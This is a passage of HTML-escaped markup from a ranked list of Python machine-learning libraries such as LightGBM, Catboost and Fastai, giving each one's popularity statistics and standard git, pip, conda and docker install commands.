⏱️ 18.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyspark&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pyspark&#34;&gt;Conda&lt;/a&gt; (📥 1.6M · ⏱️ 26.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pyspark&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/LightGBM&#34;&gt;LightGBM&lt;/a&gt;&lt;/b&gt; (🥈42 · ⭐ 14K) - A fast, distributed, high performance gradient boosting (GBT, GBDT, GBRT,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/LightGBM&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 260 · 🔀 3.5K · 📥 150K · 📦 13K · 📋 2.7K - 8% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/microsoft/LightGBM&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/lightgbm&#34;&gt;PyPi&lt;/a&gt; (📥 7.1M / month · 📦 630 · ⏱️ 07.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install lightgbm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/lightgbm&#34;&gt;Conda&lt;/a&gt; (📥 1M · ⏱️ 08.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge lightgbm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/Paddle&#34;&gt;PaddlePaddle&lt;/a&gt;&lt;/b&gt; (🥈41 · ⭐ 18K) - PArallel Distributed Deep LEarning: Machine Learning.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1M&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/Paddle&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 740 · 🔀 4.5K · 📥 15K · 📦 120 · 📋 16K - 18% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PaddlePaddle/Paddle&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/paddlepaddle&#34;&gt;PyPi&lt;/a&gt; (📥 99K / month · 📦 48 · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install paddlepaddle&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/apache/incubator-mxnet&#34;&gt;MXNet&lt;/a&gt;&lt;/b&gt; (🥈40 · ⭐ 20K) - Lightweight, Portable, Flexible Distributed/Mobile Deep Learning.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1X&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/apache/incubator-mxnet&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 970 · 🔀 6.9K · 📥 25K · 📋 9.7K - 20% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/apache/incubator-mxnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mxnet&#34;&gt;PyPi&lt;/a&gt; (📥 330K / month · 📦 280 · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mxnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/anaconda/mxnet&#34;&gt;Conda&lt;/a&gt; (📥 7.5K · 📦 5 · ⏱️ 02.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c anaconda mxnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/catboost/catboost&#34;&gt;Catboost&lt;/a&gt;&lt;/b&gt; (🥈40 · ⭐ 6.5K) - A fast, scalable, high performance Gradient Boosting on Decision.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/catboost/catboost&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 990 · 🔀 1K · 📥 80K · 📋 1.8K - 21% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/catboost/catboost&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/catboost&#34;&gt;PyPi&lt;/a&gt; (📥 2.6M / month · 📦 230 · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install catboost&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/catboost&#34;&gt;Conda&lt;/a&gt; (📥 1M · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge catboost&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/fastai/fastai&#34;&gt;Fastai&lt;/a&gt;&lt;/b&gt; (🥈39 · ⭐ 22K) - The fastai deep learning library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/fastai/fastai&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 610 · 🔀 7.2K · 📋 1.6K - 7% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/fastai/fastai&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/fastai&#34;&gt;PyPi&lt;/a&gt; (📥 280K / month · 📦 300 · ⏱️ 01.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install fastai&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jina-ai/jina&#34;&gt;Jina&lt;/a&gt;&lt;/b&gt; (🥈38 · ⭐ 15K) - Cloud-native neural search framework for kind of data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jina-ai/jina&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 150 · 🔀 1.9K · 📦 280 · 📋 1.5K - 4% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jina-ai/jina&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/jina&#34;&gt;PyPi&lt;/a&gt; (📥 60K / month · 📦 2 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install jina&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/jina-core&#34;&gt;Conda&lt;/a&gt; (📥 5.2K · ⏱️ 22.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge jina-core&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/jinaai/jina&#34;&gt;Docker Hub&lt;/a&gt; (📥 1.1M · ⭐ 7 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull jinaai/jina&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Theano/Theano&#34;&gt;Theano&lt;/a&gt;&lt;/b&gt; (🥈38 · ⭐ 9.6K) - Theano was a Python library that allows you to define, optimize, and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Theano/Theano&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 380 · 🔀 2.5K · 📦 13K · 📋 2.8K - 24% open · ⏱️ 23.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Theano/Theano&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/theano&#34;&gt;PyPi&lt;/a&gt; (📥 250K / month · 📦 2.8K · ⏱️ 27.07.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install theano&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/theano&#34;&gt;Conda&lt;/a&gt; (📥 2M · ⏱️ 16.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge theano&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/explosion/thinc&#34;&gt;Thinc&lt;/a&gt;&lt;/b&gt; (🥈37 · ⭐ 2.5K) - A refreshing functional take on deep learning, compatible with your favorite.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/explosion/thinc&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 51 · 🔀 250 · 📦 21K · 📋 120 - 16% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/explosion/thinc&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/thinc&#34;&gt;PyPi&lt;/a&gt; (📥 5.7M / month · 📦 620 · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install thinc&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/thinc&#34;&gt;Conda&lt;/a&gt; (📥 2M · ⏱️ 15.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge thinc&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/apache/flink&#34;&gt;PyFlink&lt;/a&gt;&lt;/b&gt; (🥈36 · ⭐ 19K) - Apache Flink Python API. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/apache/flink&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1.5K · 🔀 11K · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/apache/flink&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/apache-flink&#34;&gt;PyPi&lt;/a&gt; (📥 16K / month · 📦 15 · ⏱️ 26.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install apache-flink&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/chainer/chainer&#34;&gt;Chainer&lt;/a&gt;&lt;/b&gt; (🥈36 · ⭐ 5.7K) - A flexible framework of neural networks for deep learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/chainer/chainer&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 320 · 🔀 1.4K · 📦 2.6K · 📋 2K - 0% open · ⏱️ 05.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/chainer/chainer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/chainer&#34;&gt;PyPi&lt;/a&gt; (📥 17K / month · 📦 400 · ⏱️ 05.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install chainer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/chainer&#34;&gt;Conda&lt;/a&gt; (📥 7.6K · ⏱️ 21.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge chainer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google/flax&#34;&gt;Flax&lt;/a&gt;&lt;/b&gt; (🥈36 · ⭐ 3K) - Flax is a neural network library for JAX that is designed for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://jax.readthedocs.io/en/latest/_static/favicon.png&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google/flax&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 150 · 🔀 340 · 📥 42 · 📦 960 · 📋 520 - 22% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google/flax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/flax&#34;&gt;PyPi&lt;/a&gt; (📥 180K / month · 📦 69 · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install flax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/flax&#34;&gt;Conda&lt;/a&gt; (📥 4.1K · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge flax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/VowpalWabbit/vowpal_wabbit&#34;&gt;Vowpal Wabbit&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 8K) - Vowpal Wabbit is a machine learning system which pushes the.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/VowpalWabbit/vowpal_wabbit&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 320 · 🔀 1.8K · 📋 1.2K - 11% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/VowpalWabbit/vowpal_wabbit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/vowpalwabbit&#34;&gt;PyPi&lt;/a&gt; (📥 58K / month · 📦 30 · ⏱️ 06.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install vowpalwabbit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/vowpalwabbit&#34;&gt;Conda&lt;/a&gt; (📥 60K · ⏱️ 07.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge vowpalwabbit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ludwig-ai/ludwig&#34;&gt;Ludwig&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 8.3K) - Data-centric declarative deep learning framework. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ludwig-ai/ludwig&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 120 · 🔀 980 · 📦 120 · 📋 740 - 27% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ludwig-ai/ludwig&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ludwig&#34;&gt;PyPi&lt;/a&gt; (📥 3.7K / month · 📦 9 · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ludwig&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ROCmSoftwarePlatform/tensorflow-upstream&#34;&gt;tensorflow-upstream&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 590 · 📉) - TensorFlow ROCm port. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ROCmSoftwarePlatform/tensorflow-upstream&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 4K · 🔀 68 · 📥 20 · 📋 330 - 17% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ROCmSoftwarePlatform/tensorflow-upstream&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-rocm&#34;&gt;PyPi&lt;/a&gt; (📥 14K / month · 📦 5 · ⏱️ 11.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-rocm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/apple/turicreate&#34;&gt;Turi Create&lt;/a&gt;&lt;/b&gt; (🥉32 · ⭐ 11K) - Turi Create simplifies the development of custom machine learning.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/apple/turicreate&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 85 · 🔀 1.1K · 📥 6.1K · 📦 310 · 📋 1.8K - 27% open · ⏱️ 29.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/apple/turicreate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/turicreate&#34;&gt;PyPi&lt;/a&gt; (📥 31K / month · 📦 19 · ⏱️ 30.09.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install turicreate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorpack/tensorpack&#34;&gt;tensorpack&lt;/a&gt;&lt;/b&gt; (🥉32 · ⭐ 6.2K) - A Neural Net Training Interface on TensorFlow, with focus.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorpack/tensorpack&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 58 · 🔀 1.8K · 📥 130 · 📦 1K · 📋 1.3K - 0% open · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorpack/tensorpack&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorpack&#34;&gt;PyPi&lt;/a&gt; (📥 19K / month · 📦 46 · ⏱️ 22.01.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorpack&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tensorpack&#34;&gt;Conda&lt;/a&gt; (📥 1.2K · ⏱️ 06.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tensorpack&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mlpack/mlpack&#34;&gt;mlpack&lt;/a&gt;&lt;/b&gt; (🥉32 · ⭐ 4K) - mlpack: a scalable C++ machine learning library --. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/mlpack/mlpack&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 290 · 🔀 1.4K · 📋 1.5K - 6% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/mlpack/mlpack&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mlpack&#34;&gt;PyPi&lt;/a&gt; (📥 260 / month · 📦 1 · ⏱️ 28.10.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mlpack&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/mlpack&#34;&gt;Conda&lt;/a&gt; (📥 100K · ⏱️ 09.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge mlpack&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytorch/ignite&#34;&gt;Ignite&lt;/a&gt;&lt;/b&gt; (🥉32 · ⭐ 4K · 📉) - High-level library to help with training and evaluating neural.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pytorch/ignite&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 170 · 🔀 540 · 📋 1.1K - 12% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pytorch/ignite&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytorch-ignite&#34;&gt;PyPi&lt;/a&gt; (📥 170K / month · 📦 81 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytorch-ignite&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/pytorch/ignite&#34;&gt;Conda&lt;/a&gt; (📥 88K · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c pytorch ignite&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepmind/sonnet&#34;&gt;Sonnet&lt;/a&gt;&lt;/b&gt; 